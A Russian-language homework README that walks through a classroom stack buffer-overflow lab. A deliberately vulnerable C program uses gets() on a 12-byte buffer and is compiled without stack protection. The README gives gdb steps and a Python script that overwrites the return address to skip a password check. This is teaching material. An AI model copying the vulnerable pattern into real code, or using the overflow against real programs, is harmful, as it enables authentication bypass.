# Задание №5 - Функции 
## Сборщик проекта
В качестве сборщика проекта используется Makefile. Для компиляции проекта необходимо ввести следующую команду в корне проекта:
``` bash
make
```

Для очистки бинарных файлов можно воспользоваться командой:
``` bash
make clean
```

## Вспомогательный скрипт
Скрип input_string.py необходим для создания файла со строкой, которую нужно ввести в программу при помощи оператора перенаправления потока.
```
import struct
# 0x00000000004011d8 - адрес нужной инструкции
little_endian_address = struct.pack("<Q", 0x00000000004011d8)

# Записываем 20 байт мусора (12 произвольных байт и 8 произвольных байт для перезаписи стека), и адрес нужной нам инструкции
input_string = b"A" * 20 + little_endian_address 

with open("input_string.txt", "wb") as f:
    f.write(input_string)
```
## Задание
1) Переписать абонентский справочник с использованием функций.
2) Имеется программа (исходный код которой приводится ниже, компилировать с ключами: -fno-stack-protector -no-pie). Вам необходимо произвести анализ программы с помощью отладчика для выяснения длины массива для ввода пароля и адреса ветки условия проверки корректности ввода пароля, которая выполняется при условии совпадения паролей. Ввести пароль (строку символов) таким образом, чтобы перезаписать адрес возврата на выясненный адрес (есть символы которые нельзя ввести с клавиатуры, поэтому можно использовать перенаправление ввода(<) при запуске программы).
``` c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int IsPassOk(void);

int main(void) {
  int PwStatus;
  puts("Enter password:");
  PwStatus = IsPassOk();

  if (PwStatus == 0) {
    printf("Bad password!\n");
    exit(1);
  } else {
    printf("Access granted!\n");
  }
  return 0;
}

int IsPassOk(void) {
  char Pass[12];
  
  gets(Pass);

  return 0 == strcmp(Pass, "test");
}
```
## Демонстрация работы программ
Соберем проект при помощи команды:
```
make
```
Запустим отладчик:
```
gdb ./bin/main
```
Результат выполнения:
![image](https://github.com/EltexHomework/Functions/assets/70006380/152ac877-eafb-4e21-96a3-ef9f9b0914c7)

Ставим точку остановы на 11-ой строке, запускаем программу и вводим правильный пароль, переходим на инструкцию с printf("Access granted!") и делаем disassemble функции main:
```
b 11
r
test
n
disassemble main
```
Результат выполнения:
![image](https://github.com/EltexHomework/Functions/assets/70006380/54444335-350e-4b87-9bbd-de92d9800acd)

Находим адрес нужной нам инструкции, проще всего это сделат командой layout asm, текущая инструкция будет подсвечена.
Копируем адрес инструкции и вставляем его в скрипт input.py:
![image](https://github.com/EltexHomework/Functions/assets/70006380/9950e90b-a5bc-43fd-aea5-b6bd76656640)

Запускаем скрипт, который создаст файл input_string.txt и заполнит его нужной строкой. Запускаем программу перенаправляем поток ввода на наш файл:
![image](https://github.com/EltexHomework/Functions/assets/70006380/c8657540-9151-45ee-b124-918dea603bb3)
